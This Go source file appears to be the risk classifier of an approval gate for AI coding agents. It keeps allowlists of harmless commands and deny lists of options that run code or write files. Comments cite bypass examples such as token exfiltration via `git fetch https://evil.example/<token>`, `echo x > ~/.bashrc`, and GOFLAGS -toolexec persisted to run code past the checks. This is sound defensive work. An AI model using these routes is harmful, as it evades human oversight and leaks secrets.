package risk

// Known-benign shapes (R5-S7, R5-C03). "Low" used to mean "matched no rule in the table", so any
// command the table did not foresee (an interpreter one-liner, find -delete, a git global option
// in front of reset) was low, and low is one tap from a lock screen. Now low means the call
// matched a shape on this list, read after quoting, environment prefixes, wrappers, `sh -c`
// strings and git's global options are taken apart (guard.Parse). Everything else is at least
// elevated: answerable in the app, never from a notification. The table in risk.go still raises
// a call to dangerous; this list can only keep one at low.

import (
	"path/filepath"
	"regexp"
	"strings"

	"github.com/jclement/crowsnest/internal/guard"
)

// lowTools are tools that read, or write only inside the job's directory (the outside-dir check
// in Classify raises a write elsewhere).
var lowTools = map[string]bool{
	"Read": true, "Glob": true, "Grep": true, "LS": true, "NotebookRead": true, "TodoWrite": true, "WebSearch": true,
	"Edit": true, "Write": true, "MultiEdit": true, "NotebookEdit": true,
}

// unlistedTool is the reason for a tool that is not on the list.
func unlistedTool(tool string) string {
	return tool + " is not on crowsnest's list of harmless tools"
}

// benignPrograms read, print or compute, and change nothing outside what they are told to make.
var benignPrograms = map[string]bool{
	"ls": true, "cat": true, "head": true, "tail": true, "wc": true, "grep": true, "egrep": true, "fgrep": true, "rg": true,
	"ag": true, "echo": true, "printf": true, "pwd": true, "which": true, "whereis": true, "type": true, "file": true,
	"stat": true, "du": true, "df": true, "date": true, "true": true, "false": true, "sort": true, "uniq": true, "cut": true,
	"tr": true, "diff": true, "cmp": true, "comm": true, "tree": true, "basename": true, "dirname": true, "realpath": true,
	"readlink": true, "test": true, "[": true, "nl": true, "column": true, "jq": true, "fd": true, "seq": true, "sleep": true,
	"id": true, "whoami": true, "hostname": true, "uname": true, "md5sum": true, "shasum": true, "sha256sum": true,
	"mkdir": true, "touch": true, "cd": true, "pushd": true, "popd": true, "export": true, "gofmt": true,
	"pytest": true, "find": true, // find's actions that delete, run or write are refused above
}

// findWrites are find's actions that delete, run or write.
var findWrites = []string{"-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls"}

// buildTools are the toolchains whose test, build and check subcommands count as benign: they
// run the project's own code, which is what the agent is there to work on.
var buildTools = map[string]map[string]bool{
	"go":    {"test": true, "build": true, "vet": true, "fmt": true, "list": true, "version": true, "env": true, "doc": true},
	"cargo": {"test": true, "build": true, "check": true, "fmt": true, "clippy": true},
	"npm":   {"test": true},
	"pnpm":  {"test": true},
	"yarn":  {"test": true},
	"bun":   {"test": true},
}

// scriptNames are the package.json scripts and mise tasks that count as benign to run.
var scriptNames = map[string]bool{"test": true, "lint": true, "build": true, "typecheck": true, "check": true, "fmt": true}

// safeEnv are the environment variables a low command may set in front of itself (R6-S2): they
// change output and build targets, not what runs. Any other assignment (GIT_CONFIG_*, LD_PRELOAD,
// GIT_EXTERNAL_DIFF, PATH, …) can make a harmless program run something else.
var safeEnv = map[string]bool{
	"CI": true, "NO_COLOR": true, "FORCE_COLOR": true, "CLICOLOR": true, "TERM": true, "LANG": true, "LC_ALL": true, "TZ": true,
	"GOOS": true, "GOARCH": true, "CGO_ENABLED": true, "GOFLAGS": true, "GOWORK": true, "NODE_ENV": true, "RUST_BACKTRACE": true,
	"PYTHONDONTWRITEBYTECODE": true, "PYTHONUNBUFFERED": true, "VERBOSE": true, "DEBUG": true,
}

// unsafeEnv returns the first assignment in env that a low command may not carry ("" for none).
func unsafeEnv(env map[string]string) string {
	for name, value := range env {
		if !safeEnv[name] {
			return name
		}
		if name == "GOFLAGS" && (strings.Contains(value, "exec") || strings.Contains(value, "vettool")) {
			return name
		}
	}
	return ""
}

// programWrites are options of otherwise benign programs that run another program, write a file
// or change what runs (R6-S2). A command using one is not low.
var programWrites = map[string][]string{
	"fd":   {"-x", "-X", "--exec", "--exec-batch"},
	"rg":   {"--pre", "--hostname-bin"},
	"sort": {"-o", "--output", "--compress-program"},
	"tree": {"-o"},
	// go test's profile and trace options write wherever they are pointed (R9-S9), in every spelling
	// the flag package takes (-x, --x, -test.x).
	"go": goWrites,
	// pytest -p loads a module (code), --basetemp empties the directory it names (R9-S9).
	"pytest": {"-p", "--basetemp", "--junitxml", "--junit-xml", "--resultlog", "--result-log", "--confcutdir", "--rootdir", "-c", "--config-file"},
	"cargo":  {"--config", "-Z"},
	"date":   {"-s", "--set"},
}

// goWrites are go's options that run another program or write a file.
var goWrites = func() []string {
	var out []string
	for _, name := range []string{"exec", "toolexec", "vettool", "o", "modfile", "overlay", "coverprofile", "cpuprofile",
		"memprofile", "blockprofile", "mutexprofile", "trace", "outputdir", "fuzzcachedir"} {
		out = append(out, "-"+name, "--"+name, "-test."+name, "--test."+name)
	}
	return out
}()

// longPrefixes are GNU long options a program accepts abbreviated to any unambiguous prefix
// (R9-S9: `sort --out=FILE` is --output), with the shortest prefix that still means it.
var longPrefixes = map[string]map[string]string{
	"sort": {"--output": "--o", "--compress-program": "--com"},
	"rg":   {"--hostname-bin": "--hostn", "--pre": "--pre"},
}

// abbreviatedHit returns the long option of longPrefixes[program] that an arg abbreviates.
func abbreviatedHit(program string, args []string) string {
	for _, arg := range args {
		name, _, _ := strings.Cut(arg, "=")
		for option, shortest := range longPrefixes[program] {
			if strings.HasPrefix(name, shortest) && strings.HasPrefix(option, name) {
				return option
			}
		}
	}
	return ""
}

// clusteredOptions are the programs whose short options combine (`sort -uo FILE`, `fd -Hx rm`):
// their clusters are taken apart before programWrites is checked (R7-S5). Go and cargo are not
// here: go's options are single-dash words (`-count`, `-toolexec`), which would read as clusters.
var clusteredOptions = map[string]bool{"fd": true, "rg": true, "sort": true, "tree": true, "uniq": true, "date": true}

// expandClusters adds, for each `-abc` word, the single options `-a -b -c` it combines.
func expandClusters(args []string) []string {
	out := append([]string{}, args...)
	for _, arg := range args {
		if len(arg) < 3 || arg[0] != '-' || arg[1] == '-' {
			continue
		}
		for _, letter := range arg[1:] {
			out = append(out, "-"+string(letter))
		}
	}
	return out
}

// outsideRoot reports whether a path an agent's command names leaves its job's directory: an
// absolute path not inside root, a relative one that resolves outside it (through a link), the
// root's own .git, a home-relative one (~), or any `..` (the OS follows a link before the `..`).
// With no root known (the orchestrator), any absolute, ~ or .. path counts.
func outsideRoot(path, root string) bool {
	switch {
	case path == "" || path == "-":
		return false
	case strings.HasPrefix(path, "~"):
		return true
	case hasDotDot(path):
		return true
	case root == "":
		return filepath.IsAbs(path)
	}
	// Relative operands are resolved against the root too (R9-S9: a committed link inside it).
	return !inside(root, path)
}

func hasDotDot(path string) bool {
	for _, part := range strings.Split(filepath.ToSlash(path), "/") {
		if part == ".." {
			return true
		}
	}
	return false
}

// leavesRoot are the benign programs that write or move where their operands say (R7-S5): one
// pointed outside the job's directory is not low.
var leavesRoot = map[string]bool{"mkdir": true, "touch": true, "cd": true, "pushd": true}

// optionHit returns the first of opts that args use, as a word or with =value glued on.
func optionHit(args, opts []string) string {
	for _, arg := range args {
		for _, opt := range opts {
			if arg == opt || strings.HasPrefix(arg, opt+"=") || (len(opt) == 2 && opt[0] == '-' && opt[1] != '-' && strings.HasPrefix(arg, opt) && !strings.HasPrefix(arg, "--")) {
				return opt
			}
		}
	}
	return ""
}

// operands are args that are not options.
func operands(args []string) []string {
	var out []string
	for _, arg := range args {
		if !strings.HasPrefix(arg, "-") {
			out = append(out, arg)
		}
	}
	return out
}

// commandShape returns why one simple command is not benign, or "" when it is. root is the
// job's directory ("" when unknown).
func commandShape(cmd guard.Command, root string) string {
	program, args := cmd.Program, cmd.Args
	if target := outputRedirect(args); target != "" {
		return "Writes " + target + " through a redirect"
	}
	if name := unsafeEnv(cmd.Env); name != "" {
		return "Sets " + name + " for the command, which can change what it runs"
	}
	optionArgs := args
	if clusteredOptions[program] {
		optionArgs = expandClusters(args)
	}
	if opt := optionHit(optionArgs, programWrites[program]); opt != "" {
		return program + " " + opt + " runs another program or writes a file"
	}
	if opt := abbreviatedHit(program, args); opt != "" {
		return program + " " + opt + " runs another program or writes a file"
	}
	if cmd.Chdir != "" && outsideRoot(cmd.Chdir, root) {
		// env -C DIR / --chdir=DIR runs the command somewhere else (R9-S9).
		return "env -C " + cmd.Chdir + " runs the command outside the job's directory"
	}
	if leavesRoot[program] {
		for _, operand := range operands(args) {
			if outsideRoot(operand, root) {
				return program + " " + operand + " reaches outside the job's directory"
			}
		}
	}
	switch {
	case program == "":
		return ""
	case program == "git":
		return gitShape(guard.ParseGit(cmd), root)
	case program == "sed" && hasAnyPrefix(args, "-i", "--in-place"):
		return "sed -i edits files in place"
	case program == "find" && hasAny(args, findWrites...):
		return "find with an action that deletes, runs or writes (" + firstOf(args, findWrites...) + ")"
	case program == "uniq" && len(uniqOperands(args)) > 1:
		return "uniq with an output file writes it"
	case program == "export" || program == "declare" || program == "typeset":
		for _, arg := range args {
			name, _, isAssign := strings.Cut(arg, "=")
			if (isAssign && !safeEnv[name]) || strings.HasPrefix(arg, "-f") {
				return program + " " + name + " changes the environment of what runs next"
			}
		}
		return ""
	case benignPrograms[program]:
		return ""
	case program == "go" && len(args) > 0 && args[0] == "env" && hasAnyPrefix(args[1:], "-w", "-u"):
		// go env -w persists into the human's own go environment file: GOFLAGS=-toolexec=…
		// would then run the agent's program in every later build, crowsnest's checks included.
		return "go env " + firstPrefix(args[1:], "-w", "-u") + " changes the go environment of every later build"
	case buildTools[program] != nil && len(args) > 0 && buildTools[program][args[0]]:
		return ""
	case (program == "npm" || program == "pnpm" || program == "yarn" || program == "bun" || program == "mise") && len(args) > 1 && args[0] == "run" && scriptName(args[1]):
		return ""
	case program == "mise" && len(args) > 0 && (args[0] == "tasks" || args[0] == "ls"):
		return ""
	}
	return "Runs " + program + ", which is not on crowsnest's list of harmless commands"
}

// uniqOperands are uniq's input and output operands: a lone "-" (stdin) is one, so `uniq - FILE`
// writes FILE (R7-S5).
func uniqOperands(args []string) []string {
	var out []string
	for _, arg := range args {
		if arg == "-" || !strings.HasPrefix(arg, "-") {
			out = append(out, arg)
		}
	}
	return out
}

// firstPrefix is the first arg starting with one of prefixes ("" for none).
func firstPrefix(args []string, prefixes ...string) string {
	for _, arg := range args {
		for _, prefix := range prefixes {
			if strings.HasPrefix(arg, prefix) {
				return arg
			}
		}
	}
	return ""
}

// scriptName reports whether a script or task name is on the benign list (test, test:unit, …).
func scriptName(name string) bool {
	base, _, _ := strings.Cut(name, ":")
	return scriptNames[base]
}

// gitReadOnly are the git subcommands that only read the repository.
var gitReadOnly = map[string]bool{
	"status": true, "diff": true, "log": true, "show": true, "blame": true, "shortlog": true, "describe": true,
	"rev-parse": true, "rev-list": true, "ls-files": true, "ls-tree": true, "cat-file": true, "grep": true,
	"merge-base": true, "name-rev": true, "for-each-ref": true, "show-ref": true, "version": true, "help": true,
	"count-objects": true, "whatchanged": true, "add": true, "commit": true, "fetch": true,
}

// gitWrites are options of git's read-only subcommands that write a file or run a program
// (R6-S2): log/show/diff --output, grep's pager, fetch's upload-pack, an external diff or textconv
// filter the repository's configuration names.
var gitWrites = []string{"--output", "-O", "--open-files-in-pager", "--upload-pack", "-u", "--exec", "--receive-pack", "--ext-diff", "--textconv"}

// gitShape returns why a git command is not benign, or "". The dangerous and elevated rules of
// the table are matched against the plain spelling separately (Classify); this decides only
// whether the command may stay low. root is the job's directory ("" when unknown).
func gitShape(g guard.Git, root string) string {
	if opt := gitOption(g); opt != "" {
		return "git " + g.Sub + " " + opt + " writes a file or runs another program"
	}
	switch {
	case g.Repo:
		// --git-dir, --work-tree or GIT_DIR choose a repository that may be another one (R7-S5).
		return "git with --git-dir or --work-tree may act on another repository"
	case outsideRoot(g.Dir, root):
		return "git -C " + g.Dir + " acts on a repository outside the job's directory"
	case (g.Sub == "fetch" || g.Sub == "pull") && !namedRemote(g.Args):
		// A URL (or path) instead of a configured remote can carry anything in it to anywhere.
		return "git " + g.Sub + " from a URL or path rather than a configured remote"
	case len(g.Config) > 0:
		return "git with -c " + g.Config[0] + ": configuration on the command line can change what git runs (an alias, a pager, a hook path)"
	case g.ExecPath:
		return "git with --exec-path: it runs other programs as git's own"
	case g.Sub == "":
		return "git with no subcommand crowsnest can read"
	case gitReadOnly[g.Sub]:
		return ""
	case g.Sub == "branch" && !hasAny(expandClusters(g.Args), "-d", "-D", "--delete", "-m", "-M", "--move", "-f", "--force", "-c", "-C", "--copy"):
		// Short options are taken apart first: `git branch -vD develop` deletes (R9-S9).
		return ""
	case g.Sub == "tag" && (len(g.Args) == 0 || hasAny(g.Args, "-l", "--list")):
		return ""
	case g.Sub == "remote" && remoteReadOnly(g.Args):
		return ""
	case g.Sub == "config" && hasAny(g.Args, "--get", "--get-all", "--get-regexp", "--list", "-l"):
		return ""
	case g.Sub == "stash" && !hasAny(g.Args, "drop", "clear"):
		return ""
	case g.Sub == "switch" && !hasAny(expandClusters(g.Args), "-f", "--force", "--discard-changes", "-C", "--force-create"):
		return ""
	case g.Sub == "checkout" && hasAny(expandClusters(g.Args), "-b") && !hasAny(expandClusters(g.Args), "-f", "--force", "--"):
		return ""
	case g.Sub == "worktree" && len(g.Args) > 0 && g.Args[0] == "list":
		return ""
	}
	return "git " + g.Sub + " is not on crowsnest's list of harmless git commands"
}

// remoteReadOnly reports whether `git remote …` only lists or shows: no subcommand, or show or
// get-url as the subcommand itself (R9-S9: `git remote add show https://evil/<token>` names show
// as a remote, and adds it).
func remoteReadOnly(args []string) bool {
	for _, arg := range args {
		if strings.HasPrefix(arg, "-") {
			if arg == "-v" || arg == "--verbose" {
				continue
			}
			return false
		}
		return arg == "show" || arg == "get-url"
	}
	return true
}

// remoteName is a configured remote's name, the only repository a low fetch names.
var remoteName = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*$`)

// namedRemote reports whether a fetch's repository operand, if any, is a remote's name rather
// than a URL or a path (R7-S5: `git fetch https://evil.example/<token>`).
func namedRemote(args []string) bool {
	for _, arg := range args {
		if strings.HasPrefix(arg, "-") {
			continue
		}
		return remoteName.MatchString(arg)
	}
	return true
}

// outputRedirect returns the file an output redirection in args writes ("" for none): `> f`,
// `>> f`, `2>f`, `&>f`. Duplicating a descriptor (2>&1, >&2) and /dev/null write nothing, so
// `go test ./... 2>&1 | tail` stays benign while `echo x > ~/.bashrc` does not.
func outputRedirect(args []string) string {
	for i, arg := range args {
		at := strings.Index(arg, ">")
		if at < 0 || strings.Trim(arg[:at], "0123456789&") != "" {
			continue // no >, or text before it that is not a descriptor number
		}
		target := strings.TrimLeft(arg[at:], ">|")
		if target == "" && i+1 < len(args) {
			target = args[i+1]
		}
		switch {
		case target == "", strings.HasPrefix(target, "&"), target == "/dev/null":
			continue
		}
		return target
	}
	return ""
}

func hasAny(args []string, words ...string) bool {
	return firstOf(args, words...) != ""
}

func firstOf(args []string, words ...string) string {
	for _, arg := range args {
		for _, word := range words {
			if arg == word {
				return word
			}
		}
	}
	return ""
}

func hasAnyPrefix(args []string, prefixes ...string) bool {
	for _, arg := range args {
		for _, prefix := range prefixes {
			if strings.HasPrefix(arg, prefix) {
				return true
			}
		}
	}
	return false
}

// gitOption returns the first option of gitWrites a git command uses. -u means --upload-pack only
// to fetch, pull, clone and ls-remote (add -u and commit -u are harmless).
func gitOption(g guard.Git) string {
	for _, arg := range g.Args {
		for _, opt := range gitWrites {
			if opt == "-u" {
				switch g.Sub {
				case "fetch", "pull", "clone", "ls-remote":
				default:
					continue
				}
			}
			if arg == opt || strings.HasPrefix(arg, opt+"=") || (opt == "-O" && strings.HasPrefix(arg, "-O")) {
				return opt
			}
		}
	}
	return ""
}
